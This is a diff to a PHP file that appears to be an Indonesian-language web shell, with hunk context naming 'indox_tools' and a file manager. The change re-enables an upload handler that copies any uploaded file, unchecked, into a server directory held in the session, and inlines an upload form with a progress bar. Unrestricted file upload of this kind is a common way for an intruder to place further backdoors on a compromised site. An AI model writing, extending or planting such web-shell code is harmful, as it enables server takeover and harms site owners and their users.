@@ -363,53 +363,85 @@ if(isset($_GET['indox_tools'])) {
 
 //file upload
 if(isset($_FILES['file'])){
-	echo "zzzz";
-	/*if(copy($_FILES['file']['tmp_name'], $_SESSION['path'].'/'.$_FILES['file']['name'])){
-		echo '<font color="green">Upload Berhasil lihat di: '.$_SESSION['path'].'</font><br />';
-	}else{
-		echo '<font color="red">Upload Gagal</font><br/>';
+	if(copy($_FILES['file']['tmp_name'], $_SESSION['path'].'/'.$_FILES['file']['name']))
+	{
+		echo '<script>alert("SUKSES upload lihat di: '.$_SESSION['path'].'");</script>';
 	}
-	unset($_SESSION['path']);*/
+	else{
+		echo '<script>alert("GAGAL upload");</script>';
+	}
+	unset($_SESSION['path']);
 }
 if (isset($_GET['uploader'])) 
 {
 	$session_upload = ini_get("session.upload_progress.name");
 	echo '
-<body>
-  <div id="bar_blank">
-   <div id="bar_color"></div>
-  </div>
-  <div id="status"></div>
-  <form action="" method="POST" id="myForm" enctype="multipart/form-data" target="hidden_iframe">
-   
-   <input type="hidden" value="myForm" name="'.$session_upload.'">
-   <input type="file" name="file"><br>
-   <input type="submit" value="Start Upload">
+		<body>
+			<div id="bar_blank">
+				<div id="bar_color"></div>
+			</div>
+			<div id="status"></div>
+			<form action="" method="POST" id="myForm" enctype="multipart/form-data" target="hidden_iframe">
+				<input type="hidden" value="myForm" name="'.$session_upload.'">
+				<input type="file" name="file"><br>
+				<input type="submit" value="Start Upload">
+			</form>
+			<iframe id="hidden_iframe" name="hidden_iframe" src="about:blank"></iframe>
+			<script type="text/javascript">
+				function toggleBarVisibility() // progress bar
+				{
+					var e = document.getElementById("bar_blank");
+					e.style.display = (e.style.display == "block") ? "none" : "block";
+				}
+				function createRequestObject() 
+				{
+					var http;
+					if (navigator.appName == "Microsoft Internet Explorer") {
+						http = new ActiveXObject("Microsoft.XMLHTTP");
+					}
+					else {
+						http = new XMLHttpRequest();
+					}
+					return http;
+				}
+				function sendRequest() 
+				{
+					var http = createRequestObject();
+					http.open("GET", "progress.php");
+					http.onreadystatechange = function () { handleResponse(http); };
+					http.send(null);
+				}
+				function handleResponse(http) 
+				{
+					var response;
+					if (http.readyState == 4) 
+					{
+						response = http.responseText;
+						document.getElementById("bar_color").style.width = response + "%";
+						document.getElementById("status").innerHTML = response + "%";
+						if (response < 100) 
+						{
+							setTimeout("sendRequest()", 1000);
+						}
+						else {
+							toggleBarVisibility();
+							document.getElementById("status").innerHTML = "Wait...";
+						}
+					}
+				}
+				function startUpload() 
+				{
+					toggleBarVisibility();
+					setTimeout("sendRequest()", 1000);
+				}
+				(function () 
+				{
+					document.getElementById("myForm").onsubmit = startUpload;
+				})();
+			</script><br>
+			<h3>path: '.$_SESSION['path'].'
   
-  </form>
-  <iframe id="hidden_iframe" name="hidden_iframe" src="about:blank"></iframe>
-  <script type="text/javascript" src="script.js"></script><br>
-  <h3>path: '.$_SESSION['path'].'
-  
- </body>';
-
-	/*echo '<div id="bar_blank">
-			<div id="bar_color"></div>
-		  </div>
-		  <div id="status"></div>
-
-	<form enctype="multipart/form-data" method="POST" target="hidden_iframe">
-	<font color="white">File Upload :</font>
-
-	<input type="hidden" value="myForm" name="'.$session_upload.'">
-	<input type="file" name="file" />
-	<h3>path: '.$_SESSION['path'].'
-	<input type="submit" value="Start upload" />
-
-	</form>
-	<iframe id="hidden_iframe" name="hidden_iframe" src="about:blank"></iframe>
-	<script type="text/javascript" src="script.js"></script>
-	</td></tr>';*/
+		</body>';
 }
 
 //filemanager
